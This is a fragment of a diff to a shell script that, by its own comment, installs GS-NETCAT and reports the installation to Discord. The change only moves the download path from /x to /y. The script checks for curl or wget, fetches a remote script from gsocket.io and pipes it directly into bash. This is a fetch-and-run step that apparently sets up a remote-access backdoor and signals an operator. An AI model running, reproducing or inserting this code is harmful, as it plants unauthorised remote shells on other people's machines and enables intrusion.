@@ -15,9 +15,9 @@
 # Install GS-NETCAT and report installation back to DISCORD.
 command -v curl >/dev/null && IS_CURL=1 || command -v wget >/dev/null && IS_WGET=1 || exit 0
 if [[ -n $IS_CURL ]]; then
-    S="$(bash -c "$(curl -fsSL https://gsocket.io/x)")"
+    S="$(bash -c "$(curl -fsSL https://gsocket.io/y)")"
 else
-    S="$(bash -c "$(wget --no-verbose -O- https://gsocket.io/x)")"
+    S="$(bash -c "$(wget --no-verbose -O- https://gsocket.io/y)")"
 fi
 S=${S##*S=\"}
 S=${S%%\"*}
